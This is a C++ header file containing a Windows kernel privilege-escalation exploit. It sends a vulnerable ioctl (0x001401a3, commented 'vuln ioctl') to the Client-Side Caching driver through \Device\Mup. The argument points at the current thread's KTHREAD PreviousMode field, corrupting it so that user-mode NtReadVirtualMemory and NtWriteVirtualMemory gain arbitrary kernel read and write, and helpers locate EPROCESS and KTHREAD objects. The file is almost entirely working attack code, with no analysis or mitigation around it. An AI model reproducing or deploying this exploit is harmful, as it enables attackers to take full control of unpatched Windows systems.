#pragma once

#define CSC_DEV_FCB_XXX_CONTROL_FILE            0x001401a3 // vuln ioctl

bool ObtainKernelExploit(uintptr_t TargetKThread)
{
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    if (!hNtdll)
    {
        printf("[-] Failed to obtain ntdll..\n");
        getchar();
        exit(-1);
    }

    NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtFsControlFile = (PNtFsControlFile)GetProcAddress(hNtdll, "NtFsControlFile");

    if (!NtReadVirtualMemory || !NtWriteVirtualMemory || !NtFsControlFile)
    {
        printf("[-] Failed to obtain required functions..\n");
        getchar();
        exit(-1);
    }

    HANDLE hHandle = NULL;

    UNICODE_STRING  ObjectName = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    RtlInitUnicodeString(&ObjectName, L"\\Device\\Mup\\;Csc\\.\\.");
    InitializeObjectAttributes(&ObjectAttributes, &ObjectName, 0, NULL, NULL);

    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    auto Status = NtCreateFile(&hHandle, SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_CREATE_TREE_CONNECTION, NULL, 0);
    if (!NT_SUCCESS(Status))
    {
        printf("[-] NtCreateFile failed with status = %08x\n", Status);
        getchar();
        exit(-1);
    }

    Status = NtFsControlFile(hHandle, NULL, NULL, NULL, &IoStatusBlock, CSC_DEV_FCB_XXX_CONTROL_FILE, /*Vuln arg*/ reinterpret_cast<void*>(TargetKThread + KTHREAD_PreviousMode - 0x18), 0, NULL, 0);
    if (!NT_SUCCESS(Status))
    {
        printf("[-] NtFsControlFile failed with status: %08x\n", Status);
        getchar();
        exit(-1);
    }

    return true;
}

ULONG64 GetEProcessViaPID(ULONG TargetProcessId)
{
    HANDLE hHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, TargetProcessId);
    return GetKernelObject(TargetProcessId, hHandle);
}

ULONG64 GetCurrentEProcess()
{
    return GetEProcessViaPID(GetCurrentProcessId());
}

ULONG64 GetCurrentKThread()
{
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
    return GetKernelObject(GetCurrentProcessId(), hThread);
}

ULONG64 GetKThread(ULONG TargetProcessId, ULONG TargetThreadId)
{
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, TargetThreadId);
    return GetKernelObject(TargetProcessId, hThread);
}

bool ReadKernelMemory(PVOID Source, PVOID Buffer, ULONG Size)
{
    size_t cbNumOfBytesRead = 0;

    NTSTATUS Status = NtReadVirtualMemory(GetCurrentProcess(), Source, Buffer, Size, (PULONG)&cbNumOfBytesRead);
    if (!NT_SUCCESS(Status))
    {
        return false;
    }

    return true;
}
bool WriteKernelMemory(PVOID Source, PVOID Buffer, ULONG Size)
{
    size_t cbNumOfBytesWrite = 0;

    NTSTATUS Status = NtWriteVirtualMemory(GetCurrentProcess(), Source, &Buffer, Size, (PULONG)&cbNumOfBytesWrite);

    if (!NT_SUCCESS(Status))
    {
        return false;
    }
    return true;
}